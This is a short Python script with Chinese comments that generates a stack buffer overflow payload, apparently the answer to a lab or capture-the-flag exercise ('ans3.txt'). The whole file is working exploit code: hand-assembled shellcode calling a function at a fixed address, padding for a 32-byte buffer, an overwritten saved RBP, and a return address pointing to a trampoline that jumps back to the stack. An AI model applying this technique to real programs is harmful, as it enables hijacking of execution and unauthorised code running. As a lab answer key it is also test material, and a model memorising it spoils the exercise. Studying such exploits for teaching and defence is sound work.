import struct

# 构造 Shellcode
# 功能：执行 func1(0x72)
# 机器码对应汇编：
# bf 72 00 00 00          mov    edi, 0x72
# 48 c7 c0 16 12 40 00    mov    rax, 0x401216 (func1 addr)
# ff d0                   call   rax
shellcode = b'\xbf\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0'

# 计算 Padding
# 缓冲区总大小是32字节，减去Shellcode的长度
buffer_size = 32
padding_len = buffer_size - len(shellcode)
padding = b'A' * padding_len

# 覆盖 Saved RBP (8字节)
rbp_padding = b'B' * 8

# 覆盖 Return Address
# 跳转到 jmp_xs (Trampoline)，它会将执行流带回栈上的Shellcode
jmp_xs_addr = 0x401334
ret_addr = struct.pack('<Q', jmp_xs_addr)

# 组合 Payload
# [Shellcode] + [Padding] + [Saved RBP] + [jmp_xs]
payload = shellcode + padding + rbp_padding + ret_addr

# 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)
    print(f"Payload generated: {len(payload)} bytes. Shellcode size: {len(shellcode)}")